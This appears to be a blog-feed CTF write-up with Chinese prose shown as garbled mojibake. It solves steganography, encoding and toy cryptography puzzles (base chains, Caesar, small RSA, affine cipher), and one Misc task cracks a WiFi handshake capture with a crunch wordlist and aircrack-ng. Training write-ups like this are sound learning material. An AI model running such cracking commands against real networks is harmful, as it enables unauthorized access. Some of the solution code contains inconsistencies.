href="#çœŸçš„ä¸æ˜¯å›¾ç‰‡"></a></h2><p>é¢˜ç›®ç»™äº†ä¸€å¼ å›¾ç‰‡ï¼Œbinwalkä¸€ä¸‹</p><pre><code class="hljs bash">pumpkin9@pumpkin9:/mnt/c/Users/Desktop/juean$ binwalk Misc-JASEC.pngDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             PNG image, 824 x 639, 8-bit/color RGB, non-interlaced91            0x5B            Zlib compressed data, compressed140598        0x22536         End of Zip archive, footer length: 22</code></pre><p>é¢˜ç›®ä¸­æœ‰zipï¼Œå’Œæ­£å¸¸å‹ç¼©åŒ…å›¾ç‰‡å¯¹æ¯”ä¸€ä¸‹<br>emmm<br>åæ­£æ˜¯å°‘äº†ä¸ªzipå¤´äº†</p><p><a href="https://tva1.sinaimg.cn/large/006y8mN6ly1g8oaqtqp07j30ht0h544k.jpg" data-caption data-fancybox="images"><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8oaqtqp07j30ht0h544k.jpg" alt></a><br>å¯ä»¥å‘ç° 50 4B 03 04 è¢«æ›¿æ¢æˆäº†ja66</p><pre><code class="hljs bash">pumpkin9@pumpkin9:/mnt/c/Users/Desktop/juean$ binwalk Misc-JASEC.pngDECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             PNG image, 824 x 639, 8-bit/color RGB, non-interlaced91            0x5B            Zlib compressed data, compressed137859        0x21A83         Zip archive data, at least v2.0 to extract, compressed size: 2605, uncompressed size: 11258, name: subject.zip140598        0x22536         End of Zip archive, footer length: 22</code></pre><p>ç„¶åforemoståˆ†ç¦»<br>ja66è§£å‹ç¼©</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>):f = open(<span class="hljs-string">'./'</span>+str(i)+<span class="hljs-string">'/'</span>+str(i)+<span class="hljs-string">'.txt'</span>,<span class="hljs-string">'r'</span>)flag += f.read()<span class="hljs-keyword">print</span> base64.b64decode(flag)<span class="hljs-comment">#jactf&#123;64se64_1s_50_c001&#125;</span></code></pre><h2 id="what">what<a class="post-anchor" href="#what"></a></h2><h3 id="é¢˜ç›®æè¿°">é¢˜ç›®æè¿°<a class="post-anchor" href="#é¢˜ç›®æè¿°"></a></h3><p><code>=E4=BD=9B=E6=9B=B0=EF=BC=9A=E6=A2=B5=E5=83=A7=E5=A5=A2=E6=A5=9E=E5=A5=A2=E5=90=89=E8=8B=A5=E5=A5=A2=E4=B8=8D=E5=B8=9D=E5=86=A5=E5=A4=9C=E6=98=AF=E7=BC=BD=E6=9C=8B=E7=BC=BD=E7=9C=9F=E7=89=B9=E4=BF=B1=E4=B8=8A=E7=BD=B0=E8=83=BD=E7=9A=A4=E5=AE=A4=E9=98=BF=E8=AB=B3=E6=98=8E=E4=B8=80=E5=88=87=E5=91=90=E9=99=A4=E6=A2=B5=E5=A7=AA=E7=BC=BD=E5=A9=86=E5=91=90=E4=BA=A6=E5=8F=83=E4=BE=84=E5=91=BC=E7=9A=A4=E4=B8=96=E5=93=86=E7=89=B9=E5=93=86=E6=95=85=E5=8B=9D=E8=AB=B3=E7=88=8D=E8=AC=B9=E6=99=BA=E7=9A=A4=E5=8F=83=E5=AD=95=E9=80=9D=E8=AB=B3=E8=AC=B9=E6=BC=AB=E6=AD=BB=E5=8D=B3=E4=BE=84=E9=99=A4=E5=93=86=E9=80=9D=E4=BE=84=E6=98=AF=E5=A5=A2=E5=96=9D=E7=A4=99=E8=B1=86=E8=AB=B3=E6=A5=9E=E7=84=A1=E4=BF=B1=E8=80=85=E5=93=86=E5=BA=A6=E8=80=85=E3=80=82=E8=AB=B3=E7=9C=9F=E5=86=A5=E8=A8=B6=E4=BE=84=E5=8B=9D=E7=AB=9F=E8=97=9D=E5=A5=A2=E4=B8=8D=E4=BC=8A=E7=9A=A4=E8=AC=B9=E6=B6=85=E5=AD=95=E7=84=A1=E4=BB=96=E7=BE=85=E5=A4=A7=E5=BE=97=E9=97=8D=E5=93=86=E5=96=9D=E8=80=B6=E5=83=A7=E7=84=A1=E7=BE=AF=E6=BB=85=E9=99=A4=E5=88=A9=E7=BC=BD=E5=A4=9A=E6=A2=B5=E5=A4=B7=E6=A2=B5=E6=A0=97=E7=BC=BD=E8=80=85=E5=AD=95=E8=AB=B3=E7=9B=A7=E7=9A=A4=E4=B8=89=E7=BD=B0=E5=AF=AB=E8=80=81=E6=A2=B5=E8=80=B6=E5=AE=A4=E5=B8=9D=E6=A2=B5=E5=AF=AB=E7=BE=AF=E6=95=B8=E6=A2=B5=E7=9B=A1=E4=BE=84=E6=A0=97=E4=BE=84=E8=97=90=E4=BF=B1=E4=B8=96=E8=AB=B3=E4=B8=8A=E8=AB=B3=E5=A7=AA=E6=95=B8=E5=AE=A4=E5=A9=86=E7=BD=B0=E6=A7=83=E5=A5=A2=E8=A8=B6=E5=93=86=E5=A4=9A=E9=80=9D=E8=97=90=E9=81=93=E6=A2=B5=E6=A5=9E=E6=A2=B5=E5=8D=97=E4=BE=84=E8=BF=A6=E5=91=90=E7=9F=A5=E6=9C=8B=E6=A5=9E=E4=BE=84=E9=9B=A2=E5=91=90=E6=B2=99=E5=91=90=E6=99=BA=E9=81=AE=E5=A4=A7=E5=AE=A4=E7=A5=9E=E5=86=A5=E8=BC=B8=E6=AE=BF=E7=BC=BD=E6=A7=83=E6=A2=B5=E6=80=9B=E6=81=90=E8=88=8D=E7=9F=A5=E7=9A=A4=E8=BF=A6=E5=A5=A2=E8=88=AC=E8=AB=B3=E7=88=8D=E5=AF=AB=E6=BC=AB=E4=BC=8A=E4=BF=B1=E6=A0=97=E5=93=86=E4=BB=96=E4=BA=A6=E7=BC=BD=E6=A5=9E=E6=80=9B=E5=86=A5=E5=91=BC=E5=88=87=E4=BF=B1=E8=8F=A9=E8=88=8D=E5=91=90=E5=AF=A6=E6=A0=97=E5=A5=A2=E6=B3=A2=E6=91=A9=E8=AB=B3=E9=81=93=E7=BC=BD=E7=91=9F=E5=93=86=E5=AF=A6=E7=9A=A4=E7=88=8D=E5=8B=9D=E8=96=A9=E7=BD=B0=E8=AB=B8=E5=A5=A2=E8=88=AC=E8=AB=A6=E7=BD=B0=E6=98=8E=E7=BC=BD=E8=AB=A6=E5=B0=BC=E5=93=86=E6=A5=9E=E4=BD=9B=E4=BF=B1=E9=86=AF=E8=AB=B3=E6=BB=85=E5=BA=A6=E5=93=86=E6=89=80=E6=A7=83=E5=A7=AA=E9=BA=BC=E6=89=80=E6=81=90=E8=AB=B3=E4=BB=96=E4=BE=84=E5=AF=AB=E7=91=9F=E4=BE=84=E6=89=80=E5=BE=97=E9=9A=B8=E5=93=86=E9=97=8D=E5=91=90=E6=8F=90=E7=9B=A7=E5=86=A5=E5=92=92=E5=A5=A2=E6=9B=B0=E5=91=90=E6=B2=99=E6=80=AF=E8=88=AC=E5=8D=97=E6=80=AF=E5=9C=B0=E7=BC=BD=E5=96=9D=E5=86=A5=E6=83=B3=E5=91=90=E7=9B=A7=E7=BD=B0=E8=AC=B9=E5=91=BC=E8=B7=8B=E7=BC=BD=E4=B8=8A=E5=A8=91=E8=AB=A6=E6=AD=BB=E4=BE=84=E8=BF=A6</code></p><h3 id="è§£é¢˜è¿‡ç¨‹">è§£é¢˜è¿‡ç¨‹<a class="post-anchor" href="#è§£é¢˜è¿‡ç¨‹"></a></h3><p>Quoted-Printableä¹Ÿæ˜¯MIMEé‚®ä»¶ä¸­å¸¸ç”¨çš„ç¼–ç æ–¹å¼ä¹‹ä¸€ã€‚åŒBase64ä¸€æ ·ï¼Œå®ƒä¹Ÿå°†è¾“å…¥çš„å­—ç¬¦ä¸²æˆ–æ•°æ®ç¼–ç æˆå…¨æ˜¯ASCIIç çš„å¯æ‰“å°å­—ç¬¦ä¸²ã€‚<br><a href="python%E6%A8%A1%E5%9D%97%E4%B9%8Bquopri:%20quoted-printable%E7%BC%96%E8%A7%A3%E7%A0%81">quopri</a><br><code>quopri.decodestring()</code>è§£ç å¯å¾—</p><p>ä½›æ›°ï¼šæ¢µåƒ§å¥¢æ¥å¥¢å‰è‹¥å¥¢ä¸å¸å†¥å¤œæ˜¯ç¼½æœ‹ç¼½çœŸç‰¹ä¿±ä¸Šç½°èƒ½çš¤å®¤é˜¿è«³æ˜ä¸€åˆ‡å‘é™¤æ¢µå§ªç¼½å©†å‘äº¦åƒä¾„å‘¼çš¤ä¸–å“†ç‰¹å“†æ•…å‹è«³çˆè¬¹æ™ºçš¤åƒå­•é€è«³è¬¹æ¼«æ­»å³ä¾„é™¤å“†é€ä¾„æ˜¯å¥¢å–ç¤™è±†è«³æ¥ç„¡ä¿±è€…å“†åº¦è€…ã€‚è«³çœŸå†¥è¨¶ä¾„å‹ç«Ÿè—å¥¢ä¸ä¼Šçš¤è¬¹æ¶…å­•ç„¡ä»–ç¾…å¤§å¾—é—å“†å–è€¶åƒ§ç„¡ç¾¯æ»…é™¤åˆ©ç¼½å¤šæ¢µå¤·æ¢µæ —ç¼½è€…å­•è«³ç›§çš¤ä¸‰ç½°å¯«è€æ¢µè€¶å®¤å¸æ¢µå¯«ç¾¯æ•¸æ¢µç›¡ä¾„æ —ä¾„è—ä¿±ä¸–è«³ä¸Šè«³å§ªæ•¸å®¤å©†ç½°æ§ƒå¥¢è¨¶å“†å¤šé€è—é“æ¢µæ¥æ¢µå—ä¾„è¿¦å‘çŸ¥æœ‹æ¥ä¾„é›¢å‘æ²™å‘æ™ºé®å¤§å®¤ç¥å†¥è¼¸æ®¿ç¼½æ§ƒæ¢µæ€›æèˆçŸ¥çš¤è¿¦å¥¢èˆ¬è«³çˆå¯«æ¼«ä¼Šä¿±æ —å“†ä»–äº¦ç¼½æ¥æ€›å†¥å‘¼åˆ‡ä¿±è©èˆå‘å¯¦æ —å¥¢æ³¢æ‘©è«³é“ç¼½ç‘Ÿå“†å¯¦çš¤çˆå‹è–©ç½°è«¸å¥¢èˆ¬è«¦ç½°æ˜ç¼½è«¦å°¼å“†æ¥ä½›ä¿±é†¯è«³æ»…åº¦å“†æ‰€æ§ƒå§ªéº¼æ‰€æè«³ä»–ä¾„å¯«ç‘Ÿä¾„æ‰€å¾—éš¸å“†é—å‘æç›§å†¥å’’å¥¢æ›°å‘æ²™æ€¯èˆ¬å—æ€¯åœ°ç¼½å–å†¥æƒ³å‘ç›§ç½°è¬¹å‘¼è·‹ç¼½ä¸Šå¨‘è«¦æ­»ä¾„è¿¦</p><p>å‚æ‚Ÿä½›æ‰€è¨€çš„çœŸæ„<br>å…¬æ­£å‹å–„è‡ªç”±å…¬æ­£æ°‘ä¸»å…¬æ­£å’Œè°æ³•æ²»è‡ªç”±å…¬æ­£å…¬æ­£æ³•æ²»å‹å–„å¹³ç­‰å…¬æ­£çˆ±å›½å…¬æ­£å¹³ç­‰æ³•æ²»çˆ±å›½å…¬æ­£æ•¬ä¸šå…¬æ­£å‹å–„çˆ±å›½å¹³ç­‰è¯šä¿¡å¹³ç­‰æ³•æ²»æ•¬ä¸šæ³•æ²»å¹³ç­‰å…¬æ­£å…¬æ­£å…¬æ­£è¯šä¿¡å¹³ç­‰å¹³ç­‰å‹å–„æ•¬ä¸šæ³•æ²»æ°‘ä¸»æ³•æ²»å¯Œå¼ºæ³•æ²»å‹å–„æ³•æ²»<br>ç¤¾ä¼šä¸»ä¹‰æ ¸å¿ƒä»·å€¼è§‚è§£ç å¾—flag<br><code>jactf{hexin_yufo_qp}</code></p><h2 id="å°æ¢³å­">å°æ¢³å­<a class="post-anchor" href="#å°æ¢³å­"></a></h2><p>ç”Ÿæˆå­—å…¸çˆ†ç ´</p><pre><code class="hljs bash">crunch 11 11 -t 138364%%%%% -o/root/æ¡Œé¢/test.txtaircrack-ng -w /root/æ¡Œé¢/test.txt Tenda_D07D90-01.cap</code></pre><h1 id="Crypto">Crypto<a class="post-anchor" href="#Crypto"></a></h1><h2 id="è´æ–¯å®¶æ—ä¸‰è‹±æˆ˜ç¾¤é­”">è´æ–¯å®¶æ—ä¸‰è‹±æˆ˜ç¾¤é­”<a class="post-anchor" href="#è´æ–¯å®¶æ—ä¸‰è‹±æˆ˜ç¾¤é­”"></a></h2><p>ç›´æ¥ä¸Šè„šæœ¬</p><pre><code class="hljs python">$ python base.py ciphertext_ea88a4d420c804686a8899608e06130f.txt<span class="hljs-number">1</span>using base16 decode sucess.....<span class="hljs-number">2</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">3</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">4</span>using base16 decode sucess.....<span class="hljs-number">5</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">6</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">7</span>using base16 decode sucess.....<span class="hljs-number">8</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">9</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">10</span>using base16 decode sucess.....<span class="hljs-number">11</span>using base16 decode failuer.....using base32 decode sucess.....<span class="hljs-number">12</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode sucess.....<span class="hljs-number">13</span>using base16 decode failuer.....using base32 decode failuer.....using base64 decode failuer.....jactf&#123;<span class="hljs-number">4</span>(b64_32_16)&#125;</code></pre><h2 id="ç½—é©¬å¸å›½çš„å¥ åŸºè€…">ç½—é©¬å¸å›½çš„å¥ åŸºè€…<a class="post-anchor" href="#ç½—é©¬å¸å›½çš„å¥ åŸºè€…"></a></h2><p>æ ¹æ®å‡¯æ’’åŠ å¯†æ–¹å¼å’Œflagæ ¼å¼å¯å¾—</p><pre><code class="hljs python">a = <span class="hljs-string">'h^_o`[pZi^i`'</span>b = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,<span class="hljs-number">90</span>):  b= <span class="hljs-string">""</span>  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(a)):    b += chr(ord(a[i])+i+<span class="hljs-number">2</span>)  <span class="hljs-keyword">print</span> b</code></pre><h2 id="ç»å¯†æƒ…æŠ¥">ç»å¯†æƒ…æŠ¥<a class="post-anchor" href="#ç»å¯†æƒ…æŠ¥"></a></h2><h3 id="é¢˜ç›®æè¿°-1">é¢˜ç›®æè¿°<a class="post-anchor" href="#é¢˜ç›®æè¿°-1"></a></h3><blockquote><p>WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0xd<br>è€Œä¸”å°èœæ˜¨å¤©å·å¬åˆ°äº†ä¸€éƒ¨åˆ†å…³äºæƒ…æŠ¥çš„ç»å¯†èµ„æ–™ï¼Œå¦‚ä¸‹ï¼šN=5520780427 , e = 134257,ä½ èƒ½å¸®å°èœè§£å‡ºè¿™æ®µæƒ…æŠ¥å—ï¼Ÿ</p></blockquote><h3 id="è§£é¢˜è¿‡ç¨‹-1">è§£é¢˜è¿‡ç¨‹<a class="post-anchor" href="#è§£é¢˜è¿‡ç¨‹-1"></a></h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64,libnumenc = <span class="hljs-string">"WzI2NDAzMjMxMEwsIDQ5NTA2MzczNDFMLCA0MTg5MTM3MjM1TCwgMzUwMzY3NTkwNkwsIDExOTMyNzJMLCAzNzQ1MzA5NjhMLCA1MTg5MjgxNTMxTCwgMjUxNDIwMDI3MkwsIDQ0NTQzMDU1ODFMLCA2NDEwNzg1OTdMLCA0Mzk1OTMxNjU5TCwgMjcxNjQyNjU5OUwsIDQzNzUzOTE5NEwsIDM0NDgwMTM1OTZMLCAzMDcyMDcyMDlMLCA0NzUwODIwNjA2TCwgMzI1MDQwNzk5M0wsIDg1MzkwNTIwOUwsIDIxMDk3OTExNTlMLCAyNzE2NDI2NTk5TCwgMjEwNzg5OTU1NEwsIDQzOTU5MzE2NTlMLCAyNzk0Mzg0NTk4TCwgMjEwOTc5MTE1OUwsIDUyOTc3NzkwOTRMLCAxNDYwODc0Mjg2TCwgMTQ2MDg3NDI4NkwsIDc5NDkzMTY3OUwsIDc5NDkzMTY3OUwsIDU0NDcwNTE2MjJMLCA4NTM5MDUyMDlMLCAzMTk4MzQwMjE4TCwgMTE5MzI3MkwsIDE5MTIzMjMxMDFMLCA1Mjk3Nzc5MDk0TCwgMzA3MjA3MjA5TCwgMzIzMTU3MjYwOEwsIDMxOTgzNDAyMThMLCA1MTg5MjgxNTMxTCwgNTI3ODg5NTQ4TCwgNDk1MDYzNzM0MUwsIDI4MzkzNjY4MDVMLCAxMTE2NDU3MzU0TCwgNTI3ODg5NTQ4TCwgNTI5Nzc3OTA5NEwsIDMyNTA0MDc5OTNMLCA0NDU0MzA1NTgxTCwgNjUxMDM5MkwsIDMyNTA0MDc5OTNMLCAxNDYwODc0Mjg2TCwgMTA1OTAzNTEyOUwsIDMyMDAzNTk2MTJMLCA4NTM5MDUyMDlMLCAzMDcyMDcyMDlMLCAxNTY3NzkxMDFMLCAyMTQ1MzAxMzI4TCwgNTI3ODg5NTQ4TCwgMTA1OTAzNTEyOUwsIDU0NjgwMjUwNzJMLCAzNDQ4MDEzNTk2TCwgMjEwNzg5OTU1NEwsIDQxODkxMzcyMzVMLCAzNTAzNjc1OTA2TCwgMjY1MzQzNjExM0xd"</span>enc = base64.b64decode(enc)enc_list = eval(enc)flag = <span class="hljs-string">""</span><span class="hljs-keyword">print</span> enc_listd = <span class="hljs-number">3960784897</span>n = <span class="hljs-number">5520780427</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(enc_list)):m = pow(enc_list[i],d,n)flag += chr(m)<span class="hljs-keyword">print</span> flag<span class="hljs-comment">#U2FsdGVkX1/8DKBmhvO87/SOLaawwxvAdHLB9AV62nC6LhXzhatpvBcg6tlK7Fs5</span></code></pre><p>des è§£å¯†ä¸‹å³å¯<br>jactf{So_easy_RSA_and_DES}</p><h2 id="è´å¶æ–¯">è´å¶æ–¯<a class="post-anchor" href="#è´å¶æ–¯"></a></h2><h3 id="é¢˜ç›®">é¢˜ç›®<a class="post-anchor" href="#é¢˜ç›®"></a></h3><p>ä¸€å…±ç»™äº†ä¸¤ä¸ªæ–‡ä»¶<br>encode.txt</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">P</span><span class="hljs-params">(<span class="hljs-string">"*****************"</span>)</span></span>;<span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">C</span><span class="hljs-params">(<span class="hljs-string">"*****************"</span>)</span></span>;<span class="hljs-keyword">int</span> len = C.length();<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; len; k ++) &#123;<span class="hljs-keyword">int</span> where = des_find(P, C[k]);where = ((where * a) + b) mod x;<span class="hljs-built_in">cout</span> &lt;&lt; P[where];&#125;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">des_find</span><span class="hljs-params">(<span class="hljs-built_in">string</span> p, <span class="hljs-keyword">int</span> m)</span></span>&#123;<span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; p.length(); i++) &#123;<span class="hljs-keyword">if</span> (m == p[i]) &#123;<span class="hljs-keyword">return</span>  i;&#125;&#125;&#125;</code></pre><p>é¢˜ç›®.txt</p><blockquote><p>ç°å·²çŸ¥æŸé—´è°ä½¿ç”¨çš„å¯†ç æœ¬ï¼ˆè¿™å¯æ˜¯è´å¶æ–¯è®¾è®¡çš„å¯†ç æœ¬ï¼‰å¦‚ä¸‹ï¼šâ€elFXRVJUWVVJT1B4Y3Zibm1hc2RmQVNERkdISktMZ2hqa2xfcXdaWENWQk5NZXJ0e3l1aW9wfTAxMjM0OTg3NjU=â€<br>ç°è·å–åˆ°äº†ä»–ä»¬çš„åŠ å¯†ç®—æ³•ï¼ŒåŒæ—¶åŠ«è·äº†ä¸€æ®µæ•°æ®å¯†æ–‡ï¼šâ€gf9C{YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7â€<br>ä½ èƒ½ç ´è¯‘å‡ºæ˜æ–‡æ•°æ®å—ï¼Ÿ</p></blockquote><h3 id="è§£é¢˜è¿‡ç¨‹-2">è§£é¢˜è¿‡ç¨‹<a class="post-anchor" href="#è§£é¢˜è¿‡ç¨‹-2"></a></h3><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PSIZE 65   <span class="hljs-comment">//å®å®šä¹‰å¯†ç è¡¨å¤§å°</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">init_gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">des_find</span><span class="hljs-params">(<span class="hljs-built_in">string</span> p, <span class="hljs-keyword">int</span> m)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">P</span><span class="hljs-params">(<span class="hljs-string">"zQWERTYUIOPxcvbnmasdfASDFGHJKLghjkl_qwZXCVBNMert&#123;yuiop&#125;0123498765"</span>)</span></span>;               <span class="hljs-function"><span class="hljs-built_in">string</span> <span class="hljs-title">M</span><span class="hljs-params">(<span class="hljs-string">"gf9C&#123;YQ34KHN3sOwhCz3RzH3CKj3Ndpm1Bt7"</span>)</span></span>;   <span class="hljs-comment">//æ˜æ–‡ç©ºé—´ï¼Œä¸å·²çŸ¥å¯†æ–‡</span>  <span class="hljs-built_in">string</span> C;  <span class="hljs-comment">//å­˜æ”¾è§£å¯†æ˜æ–‡</span>  <span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>;   <span class="hljs-comment">//æ±‚è§£æ‰€æœ‰äº’ç´ çš„æ•°</span>  <span class="hljs-keyword">int</span> a1;  <span class="hljs-comment">//å­˜æ”¾é€†å…ƒ</span>  <span class="hljs-keyword">for</span> (i; i &lt; PSIZE; i++)  &#123;    <span class="hljs-keyword">if</span> (gcd(i, PSIZE) == <span class="hljs-number">1</span>)    &#123;  <span class="hljs-comment">//è¯´æ˜æ­¤æ—¶çš„iä¸28äº’ç´ </span>      <span class="hljs-comment">/***æ±‚è§£æ­¤æ—¶çš„içš„é€†å…ƒ***/</span>      a1 = init_gcd(i, PSIZE);      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> j = <span class="hljs-number">0</span>; j &lt; PSIZE; j++)   <span class="hljs-comment">//æ§åˆ¶bçš„éå†</span>      &#123;        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"æ­¤æ—¶ï¼ša="</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">" b="</span> &lt;&lt; j &lt;&lt; <span class="hljs-string">" açš„é€†å…ƒä¸ºï¼š"</span> &lt;&lt; a1 &lt;&lt; <span class="hljs-string">"   \""</span>;        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> k = <span class="hljs-number">0</span>; k &lt; M.length(); k++) &#123;     <span class="hljs-comment">//æ¯ä¸€ä¸ªæ±‰å­—ç«™ä¸¤ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è¦ç”¨ä¸¤ä¸ªæ•°ç»„ç©ºé—´æ¥å­˜</span>          <span class="hljs-keyword">int</span> where = des_find(P, M[k]);   <span class="hljs-comment">//åŒ¹é…å¯†æ–‡åœ¨æ˜æ–‡ç©ºé—´çš„ä½ç½®</span>          where = ((where - j)*a1) % PSIZE;          <span class="hljs-keyword">if</span> (where &lt; <span class="hljs-number">0</span>) &#123;            where += PSIZE;          &#125;          <span class="hljs-built_in">cout</span> &lt;&lt; P[where];        &#125;        <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">"\""</span> &lt;&lt; <span class="hljs-built_in">endl</span>;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> a)</span>    <span class="hljs-comment">//æ±‚äº’ç´ </span></span>&#123;  <span class="hljs-keyword">int</span> temp;  <span class="hljs-keyword">if</span> (a &lt; b)<span class="hljs-comment">//åˆ¤æ–­å¤§å°</span>  &#123;    temp = a;    a = b;    b = temp;  &#125;  <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> a;  <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> gcd(b, a%b);<span class="hljs-comment">//é€’å½’</span>&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">init_gcd</span><span class="hljs-params">(<span class="hljs-keyword">int</span> m, <span class="hljs-keyword">int</span> n)</span>   <span class="hljs-comment">//æ‰©å±•æ¬§å‡ é‡Œå¾—ç®—æ³•</span></span>&#123;  <span class="hljs-keyword">int</span> i = <span class="hljs-number">2</span>;  <span class="hljs-keyword">for</span> (i; i &lt; <span class="hljs-number">28</span>; i++)  &#123;    <span class="hljs-keyword">if</span> ((m*i) % n == <span class="hljs-number">1</span>)    &#123;      <span class="hljs-keyword">return</span> i;    &#125;  &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">des_find</span><span class="hljs-params">(<span class="hljs-built_in">string</span> p, <span class="hljs-keyword">int</span> m)</span>   <span class="hljs-comment">//ä½ç½®åŒ¹é…å‡½æ•°</span></span>&#123;  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; p.length(); i ++) &#123;    <span class="hljs-comment">//cout&lt;&lt;p[i]&lt;&lt;p[i+1]&lt;&lt;endl;</span>    <span class="hljs-keyword">if</span> (m == p[i]) &#123;      <span class="hljs-keyword">return</span>  i;    &#125;  &#125;&#125;</code></pre><p><strong>æ¥ä¸‹æ¥çš„è®¡åˆ’</strong><br>æ€»ç»“ä¸‹baseå®¶æ—<br>wasm<br>è´å¶æ–¯<br>å…³äºå­—ç¬¦å‘è¿›åˆ¶è½¬åŒ–çš„ç®—æ³•ä¸é€†å‘<br>pyc æ–‡ä»¶æ ¼å¼<br>desåŠ å¯†ebc cbc</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Glibc heap overview</title>
      <link href="/2019/01/05/Glibc-heap-overview/"/>
      <url>/2019/01/05/Glibc-heap-overview/</url>
      
